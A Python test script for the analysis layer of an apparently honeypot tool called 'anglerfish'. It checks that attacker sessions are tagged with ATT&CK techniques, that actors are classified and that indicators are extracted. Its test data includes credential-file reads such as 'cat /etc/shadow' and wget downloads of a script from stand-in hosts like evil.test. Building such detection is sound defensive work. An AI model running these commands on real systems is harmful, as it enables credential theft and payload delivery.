#!/usr/bin/env python3
"""Checks for the attack analysis / ATT&CK tagging layer."""
import os, sys, time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from anglerfish import analyze

fail = 0
def check(name, cond):
    global fail
    print("  %-58s %s" % (name, "ok" if cond else "FAILED"))
    if not cond: fail += 1

# --- event tagging ---
check("a probe tags as Reconnaissance",
      analyze.tag_event({"kind": "probe", "detail": "x"})["tactic"] == "Reconnaissance")
check("a successful login tags as Initial Access / Valid Accounts",
      analyze.tag_event({"kind": "login-result", "detail": "ok"})["technique_id"] == "T1078")
check("reading /etc/shadow is critical credential access",
      analyze.tag_command("cat /etc/shadow")["severity"] == "critical")
check("wget is Ingress Tool Transfer (C2)",
      analyze.tag_command("wget http://x/y.sh")["technique_id"] == "T1105")
check("whoami is Discovery",
      analyze.tag_command("whoami")["tactic"] == "Discovery")
check("reading an .env bait is credential access",
      analyze.tag_event({"kind": "read-file", "detail": "/srv/shares/Deploy/app.env"})["tactic"] == "Credential Access")
check("a GOTCHA is critical",
      analyze.tag_event({"kind": "gotcha", "detail": "vault-staging.b64 via shell"})["severity"] == "critical")
check("a guestbook note is Impact / Defacement",
      analyze.tag_event({"kind": "guestbook", "detail": "hi"})["technique_id"] == "T1491.001")

# --- session verdicts ---
now = time.time()
scanner = {"id": "s1", "peer_ip": "1.1.1.1", "events": [
    {"at": now, "kind": "probe", "detail": "1.1.1.1:2222"},
    {"at": now, "kind": "first-bytes", "detail": "SSH-2.0-Go"}]}
a = analyze.analyze_session(scanner)
check("a bare probe is an automated scanner", a["actor"] == "automated scanner")
check("a bare probe scores low", a["score"] < 10)

bot = {"id": "s2", "peer_ip": "2.2.2.2", "events":
       [{"at": now, "kind": "login-result", "detail": "fail"} for _ in range(6)]}
check("many failed logins read as a credential bot",
      analyze.analyze_session(bot)["actor"] == "credential bot")

human = {"id": "s3", "peer_ip": "3.3.3.3", "auth_ok": True, "username": "deploy",
         "read_files": ["/srv/shares/Deploy/app.env"],
         "gotchas": [{"path": "/home/deploy/notes/vault-staging.b64", "via": "cat"}],
         "guestbook": [{"note": "was here", "via": "shell"}],
         "events": [
             {"at": now, "kind": "login-result", "detail": "ok"},
             {"at": now, "kind": "command", "detail": "whoami"},
             {"at": now, "kind": "command", "detail": "cat /etc/passwd"},
             {"at": now, "kind": "command", "detail": "cat /srv/shares/Deploy/app.env"},
             {"at": now, "kind": "read-file", "detail": "/srv/shares/Deploy/app.env"},
             {"at": now, "kind": "gotcha", "detail": "/home/deploy/notes/vault-staging.b64 via cat"},
             {"at": now, "kind": "guestbook", "detail": "was here"}]}
h = analyze.analyze_session(human)
check("a login + hand-typed commands reads as hands-on-keyboard",
      h["actor"] == "hands-on-keyboard")
check("taking prize bait makes the session critical", h["severity"] == "critical")
check("the graffiti note is surfaced", h["graffiti"] == ["was here"])
check("Initial Access appears in the kill chain", "Initial Access" in h["kill_chain"])

# --- aggregate audit ---
rep = analyze.audit([scanner, bot, human])
check("audit counts all three sessions", rep["totals"]["sessions"] == 3)
check("audit builds a merged timeline", len(rep["timeline"]) > 0)
check("audit collects the graffiti wall", len(rep["graffiti_wall"]) == 1)
check("audit reports ATT&CK coverage", rep["totals"]["techniques"] >= 5)

# scoring must not treat N failed logins as max threat
bot9 = {"id": "s9", "peer_ip": "9.9.9.9", "events":
        [{"at": now, "kind": "login-result", "detail": "fail"} for _ in range(9)]}
check("nine failed logins do not score 100",
      analyze.analyze_session(bot9)["score"] < 60)
check("http-exploit tags as T1190",
      analyze.tag_event({"kind": "http-exploit", "detail": "log4j"})["technique_id"] == "T1190")
check("download-attempt tags as T1105 not T1041",
      analyze.tag_event({"kind": "download-attempt", "detail": "wget http://x/y"})["technique_id"] == "T1105")
check("IOC extraction pulls URLs without fetching",
      "http://evil.test/x.sh" in analyze.extract_iocs("wget http://evil.test/x.sh -O /tmp/x"))

print()
if fail:
    print("%d analyze check(s) failed." % fail); sys.exit(1)
print("All analyze checks passed.")
